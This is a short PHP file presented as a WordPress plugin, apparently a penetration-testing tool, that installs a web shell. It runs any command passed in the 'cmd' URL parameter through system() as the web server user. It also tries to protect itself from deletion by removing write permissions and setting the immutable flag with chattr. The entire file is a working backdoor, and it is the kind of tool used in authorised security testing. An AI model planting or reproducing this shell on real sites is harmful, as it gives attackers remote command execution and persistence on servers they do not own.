<?php 
    /*
    Plugin Name: Cheap & Nasty Wordpress Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably be at /wp-content/plugins/shell/shell.php
    Author: Leon Jacobs
    Version: 0.1
    Author URI: https://leonjza.github.com
    */

# attempt to protect from deletion
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

# shell it!
print_r(system($_GET["cmd"]));
